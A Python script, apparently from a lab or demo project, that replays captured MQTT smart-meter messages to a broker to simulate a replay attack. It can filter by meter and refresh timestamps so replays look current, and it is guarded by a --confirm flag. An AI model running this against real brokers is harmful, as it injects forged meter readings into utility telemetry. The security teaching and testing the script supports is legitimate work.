#!/usr/bin/env python3
"""
attacker2.py - replay captured MQTT messages to simulate a replay attack (lab only).

Usage:
# Replay all captured messages
python attacker2.py --confirm

# Replay a single capture by index
python attacker2.py --index 0 --confirm

# Replay all messages from a specific meter
python attacker2.py --meter "0xB30e05ed98d033421BB6FDE7C0a5354e1545636D" --confirm

# Replay and set timestamp to now
python attacker2.py --index 0 --preserve-ts false --confirm
"""

import os
import json
import time
import argparse
from typing import List, Dict, Any
import paho.mqtt.client as mqtt

CAPTURE_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "data", "captures.json"))
DEFAULT_BROKER = "localhost"
DEFAULT_PORT = 1883
DEFAULT_TOPIC = "grid/readings"

def load_captures() -> List[Dict[str, Any]]:
    if not os.path.exists(CAPTURE_FILE):
        print("No captures found. Run attacker.py first to capture messages.")
        return []
    with open(CAPTURE_FILE, "r") as f:
        return json.load(f)

def timestamp_now():
    return int(time.time())

def publish_message(payload_obj: Dict[str, Any], broker=DEFAULT_BROKER, port=DEFAULT_PORT, topic=None, preserve_ts=True):
    payload = dict(payload_obj)
    if not preserve_ts:
        payload['ts'] = timestamp_now()
    pub = mqtt.Client(client_id=f"attacker2_pub_{int(time.time()*1000)}")
    pub.connect(broker, port, 60)
    pub.loop_start()
    tgt = topic or payload_obj.get("topic") or DEFAULT_TOPIC
    pub.publish(tgt, json.dumps(payload, separators=(",", ":"), sort_keys=False))
    time.sleep(0.2)
    pub.loop_stop()
    pub.disconnect()
    print(f"[replay] published to {tgt} meterID={payload.get('meterID')} seq={payload.get('seq')} ts={payload.get('ts')}")

def main():
    parser = argparse.ArgumentParser(description="Replay captured MQTT messages (lab/demo only).")
    parser.add_argument("--broker", default=DEFAULT_BROKER)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--topic", default=None, help="optional target topic to override original")
    parser.add_argument("--index", type=int, help="replay single capture by index")
    parser.add_argument("--meter", help="replay captures for specific meterID")
    parser.add_argument("--preserve-ts", choices=["true","false"], default="true", help="preserve original timestamp or set to now")
    parser.add_argument("--confirm", action="store_true", help="REQUIRED to actually publish")
    parser.add_argument("--delay-between", type=float, default=0.2, help="delay between messages")
    args = parser.parse_args()

    if not args.confirm:
        print("Replay requires --confirm to avoid accidental misuse")
        return

    captures = load_captures()
    if not captures:
        return

    preserve_ts = args.preserve_ts == "true"

    # single index
    if args.index is not None:
        if 0 <= args.index < len(captures):
            publish_message(captures[args.index]["payload"], broker=args.broker, port=args.port, topic=args.topic, preserve_ts=preserve_ts)
        else:
            print("Invalid index")
        return

    # meter-specific replay
    if args.meter:
        filtered = [rec for rec in captures if rec["payload"].get("meterID","").lower() == args.meter.lower()]
        for rec in filtered:
            publish_message(rec["payload"], broker=args.broker, port=args.port, topic=args.topic, preserve_ts=preserve_ts)
            time.sleep(args.delay_between)
        print(f"Replayed {len(filtered)} messages for meter {args.meter}")
        return

    # default: replay all
    for rec in captures:
        publish_message(rec["payload"], broker=args.broker, port=args.port, topic=args.topic, preserve_ts=preserve_ts)
        time.sleep(args.delay_between)
    print(f"Replayed all {len(captures)} messages")

if __name__ == "__main__":
    main()
